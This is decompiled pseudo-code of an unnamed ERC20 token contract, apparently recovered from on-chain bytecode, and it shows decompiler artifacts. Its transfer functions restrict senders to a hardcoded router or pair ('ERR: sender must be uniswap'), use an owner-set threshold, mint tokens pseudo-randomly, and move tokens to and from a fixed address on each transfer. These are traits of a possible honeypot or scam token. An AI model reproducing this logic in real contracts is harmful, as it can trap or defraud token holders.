contract main {




// =====================  Runtime code  =====================


const name = '', 0

const decimals = 18

const symbol = '', 0


address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
address stor5;
uint256 stor6;

function totalSupply() {
    return totalSupply
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function getOwner() {
    return owner
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function sub_7282075f(?) {
    require calldata.size - 4 >= 32
    stor6 = arg1
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if allowance[msg.sender][address(arg1)] > !arg2:
        revert with 0, 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] + arg2
    emit Approval((allowance[msg.sender][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if allowance[msg.sender][address(arg1)] < arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: decreased allowance below zero'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] - arg2
    emit Approval((allowance[msg.sender][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
    if msg.sender:
        if arg1:
            if msg.sender != this.address:
                if arg1 != this.address:
                    if msg.sender != 0xf491e7b69e4244ad4002bc14e878a34207e38c29:
                        if arg1 != 0xf491e7b69e4244ad4002bc14e878a34207e38c29:
                            require arg2 <= 5000000000 * 10^18
                            if msg.sender != 0xf491e7b69e4244ad4002bc14e878a34207e38c29:
                                if stor5 != msg.sender:
                                    revert with 0, 'ERR: sender must be uniswap'
                            if stor5 != msg.sender:
                                if stor5 == arg1:
                                    if not msg.sender:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn from the zero address'
                                    if balanceOf[address(msg.sender)] < arg2 / 10:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn amount exceeds balance'
                                    balanceOf[address(msg.sender)] -= arg2 / 10
                                    if totalSupply < arg2 / 10:
                                        revert with 0, 17
                                    totalSupply -= arg2 / 10
                                    emit Transfer((arg2 / 10), msg.sender, 0);
                                    if balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] < 10^18:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn amount exceeds balance'
                                    balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] -= 10^18
                                    if totalSupply < 10^18:
                                        revert with 0, 17
                                    totalSupply -= 10^18
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  10^18,
                                    emit 0x308fdcac: 10^18
                                    emit 0x0: 10^18
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                            else:
                                if arg2 < stor6:
                                    if totalSupply > -1000000000000000001:
                                        revert with 0, 17
                                    totalSupply += 10^18
                                    if balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] > -1000000000000000001:
                                        revert with 0, 17
                                    balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] += 10^18
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  10^18,
                                    emit 0x0: 10^18
                                    emit 0x308fdcac: 10^18
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                                else:
                                    if not sha3(block.difficulty, block.timestamp, totalSupply) % 10:
                                        if not arg1:
                                            revert with 0, 'ERC20: mint to the zero address'
                                        if totalSupply > !arg2:
                                            revert with 0, 17
                                        totalSupply += arg2
                                        if balanceOf[address(arg1)] > !arg2:
                                            revert with 0, 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, 0, arg1);
                                    if totalSupply > -1000000000000000001:
                                        revert with 0, 17
                                    totalSupply += 10^18
                                    if balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] > -1000000000000000001:
                                        revert with 0, 17
                                    balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] += 10^18
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  10^18,
                                    emit 0x0: 10^18
                                    emit 0x308fdcac: 10^18
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 'ERC20: transfer amount exceeds balance'
                            ('ge', ('stor', ('map', ('mask_shl', 160, 0, 0, 'msg.sender'), ('name', 'balanceOf', 1))), ('param', 'arg2'))
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
    if not arg1:
        if allowance[address(arg1)][msg.sender] < arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    else:
        if not arg2:
            if allowance[address(arg1)][msg.sender] < arg3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
        else:
            if this.address == arg1:
                if allowance[address(arg1)][msg.sender] < arg3:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                if not arg1:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
                if not msg.sender:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
            else:
                if this.address == arg2:
                    if allowance[address(arg1)][msg.sender] < arg3:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                    if not arg1:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
                    if not msg.sender:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
                else:
                    if 0xf491e7b69e4244ad4002bc14e878a34207e38c29 == arg1:
                        if allowance[address(arg1)][msg.sender] < arg3:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                        if not arg1:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
                        if not msg.sender:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
                    else:
                        if 0xf491e7b69e4244ad4002bc14e878a34207e38c29 == arg2:
                            if allowance[address(arg1)][msg.sender] < arg3:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                            if not arg1:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
                            if not msg.sender:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
                        else:
                            require arg3 <= 5000000000 * 10^18
                            if msg.sender != 0xf491e7b69e4244ad4002bc14e878a34207e38c29:
                                if stor5 != msg.sender:
                                    revert with 0, 'ERR: sender must be uniswap'
                            if stor5 != arg1:
                                if stor5 == arg2:
                                    if not arg1:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn from the zero address'
                                    if balanceOf[address(arg1)] < arg3 / 10:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn amount exceeds balance'
                                    balanceOf[address(arg1)] -= arg3 / 10
                                    if totalSupply < arg3 / 10:
                                        revert with 0, 17
                                    totalSupply -= arg3 / 10
                                    emit Transfer((arg3 / 10), arg1, 0);
                                    if balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] < 10^18:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: burn amount exceeds balance'
                                    balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] -= 10^18
                                    if totalSupply < 10^18:
                                        revert with 0, 17
                                    totalSupply -= 10^18
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  10^18,
                                    emit 0x308fdcac: 10^18
                                    emit 0x0: 10^18
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[arg2] > !arg3:
                                    revert with 0, 17
                                balanceOf[arg2] += arg3
                                emit Transfer(arg3, arg1, arg2);
                                if allowance[address(arg1)][msg.sender] < arg3:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                                if not arg1:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
                                if not msg.sender:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
                            else:
                                if arg3 < stor6:
                                    if totalSupply > -1000000000000000001:
                                        revert with 0, 17
                                    totalSupply += 10^18
                                    if balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] > -1000000000000000001:
                                        revert with 0, 17
                                    balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] += 10^18
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  10^18,
                                    emit 0x0: 10^18
                                    emit 0x308fdcac: 10^18
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[arg2] > !arg3:
                                        revert with 0, 17
                                    balanceOf[arg2] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                    if allowance[address(arg1)][msg.sender] < arg3:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                                    if not arg1:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
                                    if not msg.sender:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
                                else:
                                    if not sha3(block.difficulty, block.timestamp, totalSupply) % 10:
                                        if not arg2:
                                            revert with 0, 'ERC20: mint to the zero address'
                                        if totalSupply > !arg3:
                                            revert with 0, 17
                                        totalSupply += arg3
                                        if balanceOf[address(arg2)] > !arg3:
                                            revert with 0, 17
                                        balanceOf[address(arg2)] += arg3
                                        emit Transfer(arg3, 0, arg2);
                                    if totalSupply > -1000000000000000001:
                                        revert with 0, 17
                                    totalSupply += 10^18
                                    if balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] > -1000000000000000001:
                                        revert with 0, 17
                                    balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] += 10^18
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  10^18,
                                    emit 0x0: 10^18
                                    emit 0x308fdcac: 10^18
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 0, 'ERC20: transfer amount exceeds balance'
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[arg2] > !arg3:
                                        revert with 0, 17
                                    balanceOf[arg2] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                    if allowance[address(arg1)][msg.sender] < arg3:
                                        revert with 0, 'ERC20: transfer amount exceeds allowance'
                                    if not arg1:
                                        revert with 0, 'ERC20: approve from the zero address'
                                    if not msg.sender:
                                        revert with 0, 'ERC20: approve to the zero address'
    ('bool', 'msg.sender')
    allowance[address(arg1)][address(msg.sender)] = allowance[address(arg1)][msg.sender] - arg3
    emit Approval((allowance[address(arg1)][msg.sender] - arg3), arg1, msg.sender);
    return 1
}

function _fallback() payable {
    if calldata.size < 4:
        require not calldata.size
    if unknown_0x715018a6(?????) <= uint32(call.func_hash) >> 224:
        if unknown_0xa457c2d7(?????) > uint32(call.func_hash) >> 224:
            if unknown_0x715018a6(?????) == uint32(call.func_hash) >> 224:
                require not msg.value
                if owner != msg.sender:
                    revert with 0, 'Ownable: caller is not the owner'
                emit OwnershipTransferred(owner, 0);
                owner = 0
            if unknown_0x7282075f(?????) == uint32(call.func_hash) >> 224:
                require not msg.value
                require calldata.size - 4 >= 32
                stor6 = arg1
            if unknown_0x893d20e8(?????) == uint32(call.func_hash) >> 224:
                require not msg.value
                return owner
            require unknown_0x95d89b41(?????) == uint32(call.func_hash) >> 224
            require not msg.value
            return '', 0
        if unknown_0xa457c2d7(?????) == uint32(call.func_hash) >> 224:
            require not msg.value
            require calldata.size - 4 >= 64
            require arg1 == address(arg1)
            if allowance[msg.sender][address(arg1)] < arg2:
                revert with 0, 'ERC20: decreased allowance below zero'
            if not msg.sender:
                revert with 0, 'ERC20: approve from the zero address'
            if not address(arg1):
                revert with 0, 'ERC20: approve to the zero address'
            allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] - arg2
            emit Approval((allowance[msg.sender][address(arg1)] - arg2), msg.sender, address(arg1));
        else:
            if uint32(call.func_hash) >> 224 != unknown_0xa9059cbb(?????):
                if unknown_0xdd62ed3e(?????) == uint32(call.func_hash) >> 224:
                    require not msg.value
                    require calldata.size - 4 >= 64
                    require arg1 == address(arg1)
                    require arg2 == address(arg2)
                    return allowance[address(arg1)][address(arg2)]
                require unknown_0xf2fde38b(?????) == uint32(call.func_hash) >> 224
                require not msg.value
                require calldata.size - 4 >= 32
                require arg1 == address(arg1)
                if owner != msg.sender:
                    revert with 0, 'Ownable: caller is not the owner'
                if not address(arg1):
                    revert with 0, 'Ownable: new owner is the zero address'
                emit OwnershipTransferred(owner, address(arg1));
                owner = address(arg1)
            require not msg.value
            require calldata.size - 4 >= 64
            require arg1 == address(arg1)
            if not msg.sender:
                revert with 0, 'ERC20: transfer from the zero address'
            if not address(arg1):
                revert with 0, 'ERC20: transfer to the zero address'
            if msg.sender:
                if address(arg1):
                    if msg.sender != this.address:
                        if address(arg1) != this.address:
                            if msg.sender != 0xf491e7b69e4244ad4002bc14e878a34207e38c29:
                                if address(arg1) != 0xf491e7b69e4244ad4002bc14e878a34207e38c29:
                                    require arg2 <= 5000000000 * 10^18
                                    if msg.sender != 0xf491e7b69e4244ad4002bc14e878a34207e38c29:
                                        if stor5 != msg.sender:
                                            revert with 0, 'ERR: sender must be uniswap'
                                    if stor5 != msg.sender:
                                        if stor5 == address(arg1):
                                            if not msg.sender:
                                                revert with 0, 'ERC20: burn from the zero address'
                                            if balanceOf[address(msg.sender)] < arg2 / 10:
                                                revert with 0, 'ERC20: burn amount exceeds balance'
                                            balanceOf[address(msg.sender)] -= arg2 / 10
                                            if totalSupply < arg2 / 10:
                                                revert with 0, 17
                                            totalSupply -= arg2 / 10
                                            emit Transfer((arg2 / 10), msg.sender, 0);
                                            if balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] < 10^18:
                                                revert with 0, 'ERC20: burn amount exceeds balance'
                                            balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] -= 10^18
                                            if totalSupply < 10^18:
                                                revert with 0, 17
                                            totalSupply -= 10^18
                                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                                          10^18,
                                            emit 0x308fdcac: 10^18
                                            emit 0x0: 10^18
                                    else:
                                        if arg2 >= stor6:
                                            if not sha3(block.difficulty, block.timestamp, totalSupply) % 10:
                                                if not address(arg1):
                                                    revert with 0, 'ERC20: mint to the zero address'
                                                if totalSupply > !arg2:
                                                    revert with 0, 17
                                                totalSupply += arg2
                                                if balanceOf[address(arg1)] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, 0, address(arg1));
                                        if totalSupply > -1000000000000000001:
                                            revert with 0, 17
                                        totalSupply += 10^18
                                        if balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] > -1000000000000000001:
                                            revert with 0, 17
                                        balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] += 10^18
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      10^18,
                                        emit 0x0: 10^18
                                        emit 0x308fdcac: 10^18
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 'ERC20: transfer amount exceeds balance'
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > !arg2:
                                        revert with 0, 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, address(arg1));
    else:
        if unknown_0x23b872dd(?????) > uint32(call.func_hash) >> 224:
            if name() == uint32(call.func_hash) >> 224:
                require not msg.value
                return '', 0
            if uint32(call.func_hash) >> 224 != approve(address arg1, uint256 arg2):
                require unknown_0x18160ddd(?????) == uint32(call.func_hash) >> 224
                require not msg.value
                return totalSupply
            require not msg.value
            require calldata.size - 4 >= 64
            require arg1 == address(arg1)
            if not msg.sender:
                revert with 0, 'ERC20: approve from the zero address'
            if not address(arg1):
                revert with 0, 'ERC20: approve to the zero address'
            allowance[address(msg.sender)][address(arg1)] = arg2
            emit Approval(arg2, msg.sender, address(arg1));
        else:
            if uint32(call.func_hash) >> 224 != unknown_0x23b872dd(?????):
                if unknown_0x313ce567(?????) == uint32(call.func_hash) >> 224:
                    require not msg.value
                    return 18
                if uint32(call.func_hash) >> 224 != unknown_0x39509351(?????):
                    require unknown_0x70a08231(?????) == uint32(call.func_hash) >> 224
                    require not msg.value
                    require calldata.size - 4 >= 32
                    require arg1 == address(arg1)
                    return balanceOf[address(arg1)]
                require not msg.value
                require calldata.size - 4 >= 64
                require arg1 == address(arg1)
                if allowance[msg.sender][address(arg1)] > !arg2:
                    revert with 0, 17
                if not msg.sender:
                    revert with 0, 'ERC20: approve from the zero address'
                if not address(arg1):
                    revert with 0, 'ERC20: approve to the zero address'
                allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] + arg2
                emit Approval((allowance[msg.sender][address(arg1)] + arg2), msg.sender, address(arg1));
            else:
                require not msg.value
                require calldata.size - 4 >= 96
                require arg1 == address(arg1)
                require arg2 == address(arg2)
                if not address(arg1):
                    revert with 0, 'ERC20: transfer from the zero address'
                if not address(arg2):
                    revert with 0, 'ERC20: transfer to the zero address'
                if address(arg1):
                    if address(arg2):
                        if address(arg1) != this.address:
                            if address(arg2) != this.address:
                                if address(arg1) != 0xf491e7b69e4244ad4002bc14e878a34207e38c29:
                                    if address(arg2) != 0xf491e7b69e4244ad4002bc14e878a34207e38c29:
                                        require arg3 <= 5000000000 * 10^18
                                        if msg.sender != 0xf491e7b69e4244ad4002bc14e878a34207e38c29:
                                            if stor5 != msg.sender:
                                                revert with 0, 'ERR: sender must be uniswap'
                                        if stor5 != address(arg1):
                                            if stor5 == address(arg2):
                                                if not address(arg1):
                                                    revert with 0, 'ERC20: burn from the zero address'
                                                if balanceOf[address(arg1)] < arg3 / 10:
                                                    revert with 0, 'ERC20: burn amount exceeds balance'
                                                balanceOf[address(arg1)] -= arg3 / 10
                                                if totalSupply < arg3 / 10:
                                                    revert with 0, 17
                                                totalSupply -= arg3 / 10
                                                emit Transfer((arg3 / 10), address(arg1), 0);
                                                if balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] < 10^18:
                                                    revert with 0, 'ERC20: burn amount exceeds balance'
                                                balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] -= 10^18
                                                if totalSupply < 10^18:
                                                    revert with 0, 17
                                                totalSupply -= 10^18
                                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                                              10^18,
                                                emit 0x308fdcac: 10^18
                                                emit 0x0: 10^18
                                        else:
                                            if arg3 >= stor6:
                                                if not sha3(block.difficulty, block.timestamp, totalSupply) % 10:
                                                    if not address(arg2):
                                                        revert with 0, 'ERC20: mint to the zero address'
                                                    if totalSupply > !arg3:
                                                        revert with 0, 17
                                                    totalSupply += arg3
                                                    if balanceOf[address(arg2)] > !arg3:
                                                        revert with 0, 17
                                                    balanceOf[address(arg2)] += arg3
                                                    emit Transfer(arg3, 0, address(arg2));
                                            if totalSupply > -1000000000000000001:
                                                revert with 0, 17
                                            totalSupply += 10^18
                                            if balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] > -1000000000000000001:
                                                revert with 0, 17
                                            balanceOf[0x308fdcac94c499c323530f7d6154a8a8732786ec] += 10^18
                                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                                          10^18,
                                            emit 0x0: 10^18
                                            emit 0x308fdcac: 10^18
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 0, 'ERC20: transfer amount exceeds balance'
                                        balanceOf[address(arg1)] -= arg3
                                        if balanceOf[address(arg2)] > !arg3:
                                            revert with 0, 17
                                        balanceOf[address(arg2)] += arg3
                                        emit Transfer(arg3, address(arg1), address(arg2));
                if allowance[address(arg1)][msg.sender] < arg3:
                    revert with 0, 'ERC20: transfer amount exceeds allowance'
                if not address(arg1):
                    revert with 0, 'ERC20: approve from the zero address'
                if not msg.sender:
                    revert with 0, 'ERC20: approve to the zero address'
                allowance[address(arg1)][address(msg.sender)] = allowance[address(arg1)][msg.sender] - arg3
                emit Approval((allowance[address(arg1)][msg.sender] - arg3), address(arg1), msg.sender);
    return 1
}



}
